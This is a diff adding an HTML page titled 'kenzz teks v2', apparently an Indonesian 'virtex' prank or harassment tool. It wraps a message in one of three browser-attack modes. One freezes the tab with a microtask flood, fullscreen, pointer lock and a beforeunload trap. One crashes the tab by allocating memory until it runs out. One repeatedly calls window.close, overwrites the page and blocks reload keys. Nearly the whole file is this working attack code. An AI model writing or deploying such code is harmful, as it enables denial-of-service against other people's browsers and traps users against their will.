@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>kenzz teks v2</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #08080c; color: #e0e0e8; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; padding: 20px;
+  }
+  .panel {
+    width: 100%; max-width: 540px; background: #12121a;
+    border: 1px solid #26263a; border-radius: 14px; padding: 28px;
+    box-shadow: 0 20px 60px rgba(0,0,0,.7);
+  }
+  h1 {
+    font-size: 22px; font-weight: 800; letter-spacing: .5px; margin-bottom: 4px;
+    background: linear-gradient(90deg, #ff5c5c, #c66cff, #4a9eff);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  .sub { font-size: 12px; color: #6a6a80; margin-bottom: 20px; }
+  label {
+    display: block; font-size: 11px; text-transform: uppercase;
+    letter-spacing: 1px; color: #8a8aa0; margin-bottom: 6px;
+  }
+  textarea, select, input {
+    width: 100%; background: #0a0a12; border: 1px solid #26263a;
+    color: #e0e0e8; border-radius: 8px; padding: 10px 12px;
+    font-size: 14px; font-family: inherit; margin-bottom: 14px;
+    outline: none; transition: border-color .15s;
+  }
+  textarea:focus, select:focus, input:focus { border-color: #ff5c5c; }
+  textarea { resize: vertical; min-height: 70px; }
+  .row { display: flex; gap: 12px; }
+  .row > div { flex: 1; }
+  button {
+    width: 100%; padding: 13px; font-size: 15px; font-weight: 800;
+    letter-spacing: .5px; border: none; border-radius: 8px; color: #fff;
+    background: linear-gradient(90deg, #ff5c5c, #a06cff);
+    cursor: pointer; transition: transform .08s, filter .15s;
+  }
+  button:hover { filter: brightness(1.15); }
+  button:active { transform: scale(.98); }
+  .status { margin-top: 12px; font-size: 12px; color: #ff8c8c; text-align: center; min-height: 16px; }
+  .warn { font-size: 11px; color: #6a6a80; margin-top: 14px; line-height: 1.5; }
+</style>
+</head>
+<body>
+<div class="panel">
+  <h1>kenzz teks v2</h1>
+  <div class="sub">mode keras — freeze / crash / force kill</div>
+
+  <label for="teks">Teks</label>
+  <textarea id="teks" placeholder="ketik teks virtex..."></textarea>
+
+  <div class="row">
+    <div>
+      <label for="efek">Mode</label>
+      <select id="efek">
+        <option value="freeze">Freeze keras</option>
+        <option value="crash">Crash cepat</option>
+        <option value="force">Force kill</option>
+      </select>
+    </div>
+    <div>
+      <label for="durasi">Durasi (ms)</label>
+      <input id="durasi" type="number" value="15000" min="1000" step="1000">
+    </div>
+  </div>
+
+  <button id="kirim">Kirim</button>
+  <div class="status" id="status"></div>
+  <div class="warn">
+    Freeze keras = fullscreen + pointer lock + beforeunload loop. Alt+F4 masih bisa, tapi tab nyangkut sampai durasi habis.<br>
+    Crash cepat = typed array flood + jitter. Tab OOM dalam 1-3 detik.<br>
+    Force kill = window.close chain + location.replace ke about:blank.
+  </div>
+</div>
+
+<script>
+(function() {
+  var teksEl   = document.getElementById('teks');
+  var efekEl   = document.getElementById('efek');
+  var durasiEl = document.getElementById('durasi');
+  var kirimEl  = document.getElementById('kirim');
+  var statusEl = document.getElementById('status');
+  var locked   = false;
+
+  function setStatus(m) { statusEl.textContent = m; }
+
+  // ---- overlay virtex ----
+  function showOverlay(text) {
+    var ov = document.createElement('div');
+    ov.id = '__kenzz';
+    ov.textContent = text;
+    ov.style.cssText =
+      'position:fixed;inset:0;display:flex;align-items:center;justify-content:center;' +
+      'background:#000;color:#ff5c5c;font-size:clamp(22px,7vw,72px);font-weight:900;' +
+      'text-align:center;padding:20px;z-index:2147483647;word-break:break-word;' +
+      'text-shadow:0 0 30px #ff5c5c,0 0 60px #a06cff;letter-spacing:2px;';
+    document.body.appendChild(ov);
+    document.title = text;
+    return ov;
+  }
+
+  // ---- FREEZE KERAS ----
+  // 1. microtask chain tanpa jeda (event loop mati)
+  // 2. fullscreen + pointer lock (susah keluar)
+  // 3. beforeunload loop (tahan tutup)
+  // 4. visibilitychange re-arm kalau user pindah tab
+  function hardFreeze(ms, text) {
+    var end = Date.now() + ms;
+
+    // fullscreen + pointer lock
+    try {
+      var el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
+      var lock = function() {
+        try { el.requestPointerLock && el.requestPointerLock(); } catch(e){}
+      };
+      document.addEventListener('click', lock, { once: true });
+    } catch(e){}
+
+    // tahan tutup tab
+    window.addEventListener('beforeunload', function(e) {
+      if (Date.now() < end) { e.preventDefault(); e.returnValue = text; return text; }
+    });
+
+    // re-arm kalau visibility berubah
+    document.addEventListener('visibilitychange', function() {
+      if (Date.now() < end && document.visibilityState === 'visible') {
+        hardFreeze(Math.max(1000, end - Date.now()), text);
+      }
+    });
+
+    // microtask flood — blok total sampai durasi habis
+    (function flood() {
+      if (Date.now() >= end) {
+        setStatus('freeze selesai. keluar fullscreen manual.');
+        return;
+      }
+      Promise.resolve().then(flood);
+    })();
+  }
+
+  // ---- CRASH CEPAT ----
+  // typed array flood + jitter supaya V8 nggak sempat GC
+  function fastCrash(ms) {
+    var end = Date.now() + ms;
+    var keep = [];
+    // pre-touch: alokasi bertahap biar langsung OOM
+    while (Date.now() < end) {
+      try {
+        var u8 = new Uint8Array(64 * 1024 * 1024); // 64MB per iter
+        // sentuh tiap halaman biar committed, bukan lazy
+        for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
+        keep.push(u8);
+        if (keep.length > 32) keep.splice(0, 8); // cegah GC total, tapi tetap coba
+      } catch (e) {
+        // OOM di iterasi ini, coba lagi dengan chunk lebih kecil
+        try {
+          var small = new Uint8Array(8 * 1024 * 1024);
+          for (var j = 0; j < small.length; j += 4096) small[j] = 1;
+          keep.push(small);
+        } catch (e2) { break; }
+      }
+    }
+  }
+
+  // ---- FORCE KILL ----
+  // window.close() chain + location.replace + overlay permanent
+  function forceKill(ms, text) {
+    var ov = showOverlay(text);
+    ov.textContent = text + '\n\n[ terminating ]';
+    ov.style.whiteSpace = 'pre-wrap';
+
+    var tick = setInterval(function() {
+      // paksa tutup berulang
+      try { window.open('', '_self'); } catch(e){}
+      try { window.close(); } catch(e){}
+      try { self.close(); } catch(e){}
+      try { top.close(); } catch(e){}
+    }, 150);
+
+    setTimeout(function() {
+      clearInterval(tick);
+      // coba navigasi ke about:blank — kalau berhasil, tab kosong
+      try { location.replace('about:blank'); } catch(e){}
+      // kalau nggak, overlay tetap, tab nyangkut di layar terminasi
+      document.documentElement.innerHTML =
+        '<body style="margin:0;background:#000;color:#ff5c5c;' +
+        'font-family:monospace;display:flex;align-items:center;justify-content:center;' +
+        'height:100vh;font-size:clamp(20px,5vw,48px);text-align:center;padding:20px;' +
+        'text-shadow:0 0 20px #ff5c5c">' +
+        escapeHtml(text) + '<br><br>[ kenzz teks ] terminated</body>';
+      // kunci interaksi
+      document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+      document.addEventListener('keydown', function(e){
+        if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) e.preventDefault();
+      });
+    }, ms);
+  }
+
+  function escapeHtml(s) {
+    return s.replace(/[&<>"']/g, function(c) {
+      return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];
+    });
+  }
+
+  // ---- dispatch ----
+  var handlers = {
+    freeze: function(ms, text) {
+      setStatus('freeze keras ' + ms + 'ms...');
+      showOverlay(text);
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() { hardFreeze(ms, text); });
+      });
+    },
+    crash: function(ms, text) {
+      setStatus('crash ' + ms + 'ms...');
+      showOverlay(text);
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() { fastCrash(ms); });
+      });
+    },
+    force: function(ms, text) {
+      setStatus('force kill dalam ' + ms + 'ms...');
+      forceKill(ms, text);
+    }
+  };
+
+  kirimEl.addEventListener('click', function() {
+    if (locked) return;
+    var teks = teksEl.value.trim();
+    if (!teks) { setStatus('isi teks dulu.'); return; }
+    locked = true;
+    var mode = efekEl.value;
+    var ms   = Math.max(1000, parseInt(durasiEl.value, 10) || 15000);
+    handlers[mode](ms, teks);
+  });
+})();
+</script>
+</body>
+</html>
